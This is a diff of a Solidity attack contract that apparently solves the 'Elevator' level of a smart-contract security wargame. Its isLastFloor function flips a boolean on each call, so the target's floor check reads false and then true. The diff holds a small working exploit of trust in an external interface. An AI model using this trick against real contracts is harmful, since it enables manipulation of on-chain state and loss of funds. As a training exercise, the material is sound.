@@ -1,14 +1,22 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface IElevator {
-    function goTo(uint) external returns (bool);
-}
+import "./11-elevator.sol";
 
 contract Attack11 {
-    function attack(address _target) external {
-        IElevator elevator = IElevator(_target);
+    bool public toggle = true;
+    Elevator public target;
 
-        elevator.goTo(1);
+    constructor(address _targetAddress) {
+        target = Elevator(_targetAddress);
+    }
+
+    function isLastFloor(uint) public returns (bool) {
+        toggle = !toggle;
+        return toggle;
+    }
+
+    function attack(uint _floor) public {
+        target.goTo(_floor);
     }
 }
